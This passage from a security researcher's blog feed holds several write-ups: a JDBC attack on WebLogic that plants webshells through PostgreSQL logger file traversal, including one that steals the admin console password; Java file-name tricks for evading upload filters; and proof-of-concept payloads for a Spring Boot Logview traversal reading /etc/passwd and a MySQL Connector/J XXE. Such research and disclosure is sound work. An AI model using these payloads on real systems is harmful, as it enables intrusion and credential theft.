necessary.</p><p><img src="/images/pasted-125.png" alt="upload successful"></p><p>Try to create a Webshell with a line of concise JSP code. The target directory is<code>../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/</code></p><p>The preliminary payload seems like this </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=&lt;%Runtime.getRuntime().exec(&quot;open -a calculator&quot;)&#125;;%&gt;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/she11.jsp</span><br></pre></td></tr></table></figure><p>Unfortunately it throws exceptions directly, Weblogic Server will decode <code>%Ru</code> (<code>%</code> and the next two characters <code>Ru</code>) with  <code>URLDecoder()</code> method,the exception is as follow</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Could not establish a connection because of java.lang.IllegalArgumentException: URLDecoder: Illegal hex characters in escape (%) pattern - For input string: &quot;Ru&quot;&lt;br/&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-126.png" alt="upload successful"></p><p>Suddenly Expression Language comes to my mind, it can replace JSP to avoid decoding <code>%</code> exceptionally. By the way, Servlet &lt;=2.3 is not supportive of Expression Language by default.It’s necessary to make sure the Weblogic Server built-in Servlet version. In my illustration, Weblogic Server14 with its built-in Servlet 4.0. Servlet &gt; 2.3  is supportive of Expression Language by default.</p><p><img src="/images/pasted-127.png" alt="upload successful"></p><p>Everything is ready. The final PoC like this</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=$&#123;Runtime.getRuntime().exec(&quot;open -a calculator&quot;)&#125;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/calc.jsp</span><br></pre></td></tr></table></figure><p>Access Webshell URL, then the calculator pops up.</p><p><img src="/images/pasted-128.png" alt="upload successful"></p><p><strong>d. Weblogic Server Console Password Stealing Webshell</strong></p><p>In the above illustration, I replace JSP with Expression Language successfully, but Expression Language is limited, for example, value cannot be assigned to a variable.</p><p>As we know,the Expression Language defines a set of implicit objects,like  <code>pageContext</code>, it’s pretty useful.</p><p>When instantiating the class <code>javax.servlet.jsp.PageContext</code>, we create an object <code>pageContext</code>, it represnets the entire JSP page. </p><p>Set attribute with <code>pageContext.setAttribute()</code> method and get attribute with <code>pageContext.getAttribute()</code>. If the page scope is not appointed，the order will be  <code>page → request → session → application</code>. Page scope is the default, and the <code>pageContext</code> object belongs to page scope.</p><p>If you know about the above acknowledge, using Java reflection can achieve the desired effect. So the final PoC like this</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=$&#123;pageContext.setAttribute(&quot;classLoader&quot;,Thread.currentThread().getContextClassLoader());pageContext.setAttribute(&quot;httpDataTransferHandler&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.deploy.service.datatransferhandlers.HttpDataTransferHandler&quot;));pageContext.setAttribute(&quot;managementService&quot;, pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.management.provider.ManagementService&quot;));pageContext.setAttribute(&quot;authenticatedSubject&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.security.acl.internal.AuthenticatedSubject&quot;));pageContext.setAttribute(&quot;propertyService&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.management.provider.PropertyService&quot;));pageContext.setAttribute(&quot;KERNE_ID&quot;,pageContext.getAttribute(&quot;httpDataTransferHandler&quot;).getDeclaredField(&quot;KERNE_ID&quot;));pageContext.getAttribute(&quot;KERNE_ID&quot;).setAccessible(true);pageContext.setAttribute(&quot;getPropertyService&quot;,managementService.getMethod(&quot;getPropertyService&quot;,pageContext.getAttribute(&quot;authenticatedSubject&quot;)));pageContext.getAttribute(&quot;getPropertyService&quot;).setAccessible(true);pageContext.setAttribute(&quot;prop&quot;,pageContext.getAttribute(&quot;getPropertyService&quot;).invoke(null,pageContext.getAttribute(&quot;KERNE_ID&quot;).get((null))));pageContext.setAttribute(&quot;getTimestamp1&quot;,propertyService.getMethod(&quot;getTimestamp1&quot;));pageContext.getAttribute(&quot;getTimestamp1&quot;).setAccessible(true);pageContext.setAttribute(&quot;getTimestamp2&quot;,propertyService.getMethod(&quot;getTimestamp2&quot;));pageContext.getAttribute(&quot;getTimestamp2&quot;).setAccessible(true);pageContext.setAttribute(&quot;username&quot;, pageContext.getAttribute(&quot;getTimestamp1&quot;).invoke(pageContext.getAttribute(&quot;prop&quot;)));pageContext.setAttribute(&quot;password&quot;,pageContext.getAttribute(&quot;getTimestamp2&quot;).invoke(pageContext.getAttribute(&quot;prop&quot;)));pageContext.getAttribute(&quot;username&quot;).concat(&quot;/&quot;).concat(pageContext.getAttribute(&quot;password&quot;))&#125;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/passwd.jsp</span><br></pre></td></tr></table></figure><p>At last, access the Webshell which we create. Steal the username and password successfully, they are log-in credentials of Weblogic Server administration console.</p><p><img src="/images/pasted-129.png" alt="upload successful"></p><h5 id="0x04-Conclusion"><a href="#0x04-Conclusion" class="headerlink" title="0x04 Conclusion"></a>0x04 Conclusion</h5><p>JDBC is widely used because of the Java language.So the attack interface of JDBC makes a great impact. One scenario is cloud computing platform, the users can configure their JDBC connections of a cloud database service.The other scenario is authorization bypass weakness in Java frameworks.Both the scenarios make JDBC connection URL controllable easily.</p><p>I summarize my research as a write-up and hope someone insterested with the attack interface will follow my research and keep on making JDBC attacks brilliant again!</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Arbitrary File Upload Tricks In Java </title>
      <link href="/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/"/>
      <url>/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/</url>
      
        <content type="html"><![CDATA[<h5 id="0x01-Forewords"><a href="#0x01-Forewords" class="headerlink" title="0x01 Forewords"></a>0x01 Forewords</h5><p>Recently I see some discussions about arbitrary file upload in Java environment on Internet. The main takling points are how to bypass file name detection when uploading arbitrary file.</p><p>Consequently I write this article to summerize the tricks.</p><h5 id="0x02-Juicy-Tricks"><a href="#0x02-Juicy-Tricks" class="headerlink" title="0x02 Juicy Tricks"></a>0x02 Juicy Tricks</h5><ul><li>Use <code>getSubmittedFileName</code> method to obtain file name </li></ul><p>When we use original <code>Servlet</code> to develop a multipart format file upload feature in Java, <code>getSubmittedFileName()</code> method is often utilized to obtain the file name, especially in early Java applications. But a potential problem involving this method.</p><p>We can debug the code to analyse it.Firstly set the breakpoint at <code>getSubmittedFileName</code> , then step into the next method named <code>HttpParser.unquote()</code>, here is the place which file name is obtained.</p><p><img src="/images/pasted-95.png" alt="upload successful"></p><p>During debugging the code, we can find that when file name containing <code>\</code> , it will be omitted. Finally the file name becomes <code>pyn3rd.jsp</code></p><p><img src="/images/pasted-96.png" alt="upload successful"></p><p>So we can use this peculiarity to evade file name detection，like regular expression based WAF.</p><p><img src="/images/pasted-97.png" alt="upload successful"></p><p>Significantly, we also can use one single <code>&quot;</code> in <code>filename</code> parameter value with one characters appended to file extension and one <code>\</code> in filename.</p><p><img src="/images/pasted-222.png" alt="upload successful"></p><ul><li>Use <code>getOriginalFilename</code> method to obtain file name </li></ul><p>As we know, the scenario of multipart format file upload in SpringBoot, we are used to utilize <code>getOriginalFilename()</code> method to obtain file name,<br>it can obtain file name directly without any file name changes.</p><p><img src="/images/pasted-98.png" alt="upload successful"></p><p><img src="/images/pasted-99.png" alt="upload successful"></p><p>However, when we use another method named <code>StringUtils.cleanPath()</code> to normalize the file name which <code>getOriginalFilename()</code> method obtains, another peculiarity existing. We can use one or more <code>/.</code> to append the file name.</p><p><code>/</code> is used as a delimiter and <code>.</code> means the current directory. If it points to current directory,just drop it. So the result of the file name is <code>pyn3rd.jsp</code></p><p><img src="/images/pasted-100.png" alt="upload successful"></p><p><img src="/images/pasted-101.png" alt="upload successful"></p><p>By the way, in Java (Windows system), <code>\</code> is always transformed to <code>/</code>, when we encounter SSRF/XXE vulnerablities, trying to replace <code>\</code> with <code>/</code>, for example, <code>http:\/</code> replaces <code>http://</code></p><p><img src="/images/pasted-102.png" alt="upload successful"></p><ul><li>Use <code>Apache commons-fileupload/commons-io</code> method to obtain file name </li></ul><p>We can also use some common Java libraries like <code>org.apache.commons.fileupload.FileItem.getName</code> or  <code>org.apache.commons.io.FilenameUtils.getName</code> to obtain file name. For example,<code>commons-io</code> is analyzed as follow</p><p><img src="/images/pasted-103.png" alt="upload successful"></p><p>If <code>/</code> or <code>/[SPACE]</code> is appended at the end of the file name. In the other words, <code>/</code> with zero character or null character, the results of the file name are both <code>pyn3rd.jsp</code></p><p><img src="/images/pasted-104.png" alt="upload successful"></p><p><img src="/images/pasted-105.png" alt="upload successful"></p><p><img src="/images/pasted-106.png" alt="upload successful"></p><p>If <code>/</code> or <code>/[SPACE]</code> is appended at the end of the file name.In case of the non-blank characters existing behind the delimiter <code>/</code>,<br>the characters behind <code>/</code> will be obtained as the file name. </p><p><img src="/images/pasted-107.png" alt="upload successful"></p><h5 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h5><p>The different normalization results depend on the implements of varied jar libraries and the personal habbits of developers. If the developers don’t know about this, potential vulnerablities seem inevitable. Thus, the in-depth research of normalization diversities will help us evade defense.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-21234 Spring Boot Actuator Logview Directory Traversal</title>
      <link href="/2021/10/25/CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal/"/>
      <url>/2021/10/25/CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal/</url>
      
        <content type="html"><![CDATA[<h5 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h5><p>Prior to spring-boot-actuator-logview 0.2.13, the <code>securityCheck()</code> method exists in <code>LogViewEndpoint</code>, but the <code>securityCheck()</code> method only filter the <code>..</code> in <code>fileName</code>, ignoring the security check of <code>basePath</code>, so the attacker can construct payload with the evasion of check in <code>basePath</code>.</p><h5 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h5><p>Start up tomcat server of SpringBoot project, if the page looks like this, it means SpringBoot Actutor Logview works well.</p><p><img src="/images/pasted-7.png" alt="upload successful"></p><p>Set break piont at <code>securityCheck()</code> meanwhile sending a HTTP request with the PoC <code>http://localhost:8887/manage/log/view?filename=/etc/passwd&amp;base=../../../../../</code>, then you will step into the screenshot as follow</p><p><img src="/images/pasted-8.png" alt="upload successful"></p><p><img src="/images/pasted-12.png" alt="upload successful"></p><p>Firstly step into <code>lggingPath()</code></p><p><img src="/images/pasted-13.png" alt="upload successful"></p><p>Then step into <code>streamContent</code>,<br>here you can see <code>spring.log/../../../../../</code> as folder, and <code>/etc/passwd</code> is the file we want to read.</p><p><img src="/images/pasted-14.png" alt="upload successful"></p><p>Next step into <code>toFile()</code> method , the folder <code>spring.log/../../../../../</code> and the file <code>/etc/passwd</code> will be concated as the final path without secrity check any more.</p><p><img src="/images/pasted-15.png" alt="upload successful"></p><p>Consequently you can retreive the content of file <code>/etc/passwd</code></p><p><img src="/images/pasted-16.png" alt="upload successful"></p><h5 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h5><p><code>http://localhost:8887/manage/log/view?filename=/etc/passwd&amp;base=../../../../../</code></p><h5 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h5><p>From spring-boot-actuator-logview 0.2.13, <code>basePath</code> has strict security check, the path traversal is not permitted any more.<br><img src="/images/pasted-17.png" alt="upload successful"></p><h5 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h5><p><a href="https://github.com/lukashinsch/spring-boot-actuator-logview/commit/760acbb939a8d1f7d1a7dfcd51ca848eea04e772">https://github.com/lukashinsch/spring-boot-actuator-logview/commit/760acbb939a8d1f7d1a7dfcd51ca848eea04e772</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-2471 MySQL JDBC Connector XXE</title>
      <link href="/2021/10/22/mysql-jdbc-xxe/"/>
      <url>/2021/10/22/mysql-jdbc-xxe/</url>
      
        <content type="html"><![CDATA[<h5 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h5><p>Prior to MySQL Connector/J    8.0.27, the <code>getSource()</code> method exists in <code>MysqlSQLXML</code>, but the <code>getSource()</code> method has no security check when external general entities included in XML sources, consequently, here exists a XXE vulnerability.</p><h5 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h5><p>Set break piont at the <code>getSource()</code> method, according to the source code, if the class is <code>DOMSource</code> , <code>DocumentBuilder</code> will be utilized to parse the XML source data.<br><img src="/images/pasted-2.png" alt="upload successful"></p><p>Unfortunately, there is no any security check when a new instance created. So we can construct a XML with external entities.<br><img src="/images/pasted-4.png" alt="upload successful"></p><p>However, from MySQL Connector/J 8.0.27, security attributes are set up to check XML sources before the object instantiated.<br><img src="/images/pasted-1.png" alt="upload successful"></p><p><img src="/images/pasted-6.png" alt="upload successful"></p><h5 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import com.mysql.cj.jdbc.MysqlSQLXML;</span><br><span class="line">import javax.xml.transform.dom.DOMSource;</span><br><span class="line">import java.sql.SQLException;</span><br><span class="line"></span><br><span class="line">public class MySQLDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws SQLException &#123;</span><br><span class="line">        MysqlSQLXML myXML = new MysqlSQLXML(null);</span><br><span class="line">        myXML.setString(&quot;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM \&quot;http://127.0.0.1:8000/test.dtd\&quot;&gt; %xxe;]&gt;&quot;);</span><br><span class="line">        myXML.getSource(DOMSource.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h5><p>In line with good XML practices, the getSource() method of MysqlSQLXML no longer supports external DTD, external general entities, and external general parameters in XML sources. </p><h5 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h5><ul><li><p>2021/07/10 Report to Oracle</p></li><li><p>2021/07/23 Fix the issue</p></li><li><p>2021/10/19 Credit and assign CVE number</p></li><li><p>2021/10/19 Release MySQL Connector/J 8.0.27 </p></li></ul><h5 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h5><p><a href="https://www.oracle.com/security-alerts/cpuoct2021.html">https://www.oracle.com/security-alerts/cpuoct2021.html</a><br><a href="https://dev.mysql.com/doc/relnotes/connector-j/8.0/en/news-8-0-27.html">https://dev.mysql.com/doc/relnotes/connector-j/8.0/en/news-8-0-27.html</a><br><a href="https://github.com/mysql/mysql-connector-j/commits/4993d5735fd84a46e7d949ad1bcaa0e9bb039824/src/main/user-impl/java/com/mysql/cj/jdbc/MysqlSQLXML.java">https://github.com/mysql/mysql-connector-j/commits/4993d5735fd84a46e7d949ad1bcaa0e9bb039824/src/main/user-impl/java/com/mysql/cj/jdbc/MysqlSQLXML.java</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
